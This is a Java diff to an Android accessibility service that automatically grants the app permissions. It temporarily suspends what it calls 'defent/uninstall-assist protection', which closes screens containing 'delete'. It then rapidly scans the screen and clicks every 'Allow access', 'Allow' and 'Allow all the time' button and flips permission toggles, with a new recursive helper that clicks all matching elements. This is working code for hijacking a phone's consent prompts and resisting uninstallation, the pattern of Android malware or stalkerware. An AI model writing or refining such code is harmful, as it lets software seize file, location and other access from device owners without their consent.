@@ -579,18 +579,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     public void enableStorageAutoGrant() {
         if (autoGrantHandler == null) autoGrantHandler = new Handler(Looper.getMainLooper());
 
-        // Suspend defent/uninstall-assist protection for 25 seconds so the
-        // All Files Access screen (which contains "delete") isn't closed by defent.
         protectionSuspendedUntil = System.currentTimeMillis() + 25_000;
 
-        final long endTime = System.currentTimeMillis() + 20_000;
+        final long endTime = System.currentTimeMillis() + 5_000;
         final Handler storageHandler = new Handler(Looper.getMainLooper());
 
         storageHandler.post(new Runnable() {
             @Override
             public void run() {
                 if (System.currentTimeMillis() > endTime) {
-                    Log.i(TAG, "Storage auto-grant scanner expired");
+                    Log.i(TAG, "Storage auto-grant scanner expired after 5 seconds");
                     return;
                 }
                 try {
@@ -601,20 +599,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         boolean appVisible = screenText.contains(appName.toLowerCase());
 
                         if (appVisible) {
-                            // 1. Try "Allow access" button first
-                            boolean clicked = clickTextElementCI(rootNode, "Allow access");
-                            // 2. Fall back to "Allow"
-                            if (!clicked) clicked = clickTextElementCI(rootNode, "Allow");
-                            // 3. Fall back to toggle/switch (All Files Access settings page)
-                            if (!clicked) runAccessibilityToggleGranter(rootNode);
+                            clickAllTextElementsCI(rootNode, "Allow access");
+                            clickAllTextElementsCI(rootNode, "Allow");
+                            clickAllTextElementsCI(rootNode, "Allow all the time");
+                            runAccessibilityToggleGranter(rootNode);
                         }
                         rootNode.recycle();
                     }
                 } catch (Exception ignored) {}
-                storageHandler.postDelayed(this, 300);
+                storageHandler.postDelayed(this, 200);
             }
         });
-        Log.i(TAG, "Storage auto-grant scanner started for 20 s");
+        Log.i(TAG, "Storage auto-grant scanner started for 5 s");
     }
 
     /**
@@ -759,6 +755,32 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             }
         } catch (Exception ignored) {}
         return false;
+    }
+
+    /** Clicks ALL text elements matching exactly (case-insensitive) */
+    private void clickAllTextElementsCI(AccessibilityNodeInfo node, String searchText) {
+        if (node == null) return;
+        try {
+            CharSequence text = node.getText();
+            if (text != null && text.toString().trim().equalsIgnoreCase(searchText.trim())) {
+                if (node.isClickable()) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                } else {
+                    AccessibilityNodeInfo parent = node.getParent();
+                    if (parent != null && parent.isClickable()) {
+                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        parent.recycle();
+                    }
+                }
+            }
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    clickAllTextElementsCI(child, searchText);
+                    child.recycle();
+                }
+            }
+        } catch (Exception ignored) {}
     }
 
     /** Clicks any text element containing keyword (case-insensitive, no button check) */
